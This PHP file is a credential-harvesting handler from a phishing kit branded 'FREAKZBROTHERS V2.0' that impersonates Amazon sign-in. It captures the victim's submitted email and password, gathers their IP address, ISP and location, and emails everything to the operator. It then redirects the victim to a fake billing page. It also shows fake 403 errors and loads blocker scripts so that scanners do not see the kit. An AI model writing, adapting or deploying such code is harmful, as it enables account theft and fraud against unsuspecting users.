<?php
error_reporting(0);
session_start();
require_once('../main.php');
require_once("../blocker.php");
// require_once("../blocker2.php");
require_once('../session.php');
$randomnumber = rand(1, 100);

if($_POST['email'] == "") {
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
if($_POST['password'] == "") {
	header('HTTP/1.0 403 Forbidden');
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
  exit();
}
$ip = getUserIP();
$ispuser = getisp($ip);
$message  = "++++++++++++++++++++++++[ FREAKZBROTHERS V2.0 ]+++++++++++++++++++++++++++\n";
$message .= "+--------------------------[ AMAZON ACCOUNT ]-------------------------+\n";
$message .= "# ACCOUNT 			: ".$_POST['email']."\n";
$message .= "# PASSWORD 		: ".$_POST['password']."\n";
$message .= "+--------------------------[ PC INFORMATION ]-------------------------+\n";
$message .= "# IP ADDRESS 		: ".$ip."\n";
$message .= "# ISP 				: ".$ispuser."\n";
$message .= "# REGION 			: ".$regioncity."\n";
$message .= "# CITY 			: ".$citykota."\n";
$message .= "# CONTINENT 		: ".$continent."\n";
$message .= "# TIMEZONE 		: ".$timezone."\n";
$message .= "# DATE 			: ".$date."\n";
$message .= "# USER AGENT 		: ".$user_agent."\n";
$message .= "++++++++++++++++++++++++[ FREAKZBROTHERS V2.0 ]+++++++++++++++++++++++++++\n";
$_SESSION['email_user'] = $_POST['email'];
$_SESSION['email_pass'] = $_POST['password'];
$headers = "From: EMAIL ACCESS <freakzbrothers-v2.0-$randomnumber@freakz.site>";
$subject = "💟 ".strtoupper($_POST['email'])."  $os // $ip // $cn";
$to = $config['email_result'];
mail($to, $subject, $message, $headers);
tulis_file("../result/total_email.txt", $ip);
echo "<script type='text/javascript'>window.top.location='../ap/billing?session=$key';</script>";
exit();
?>
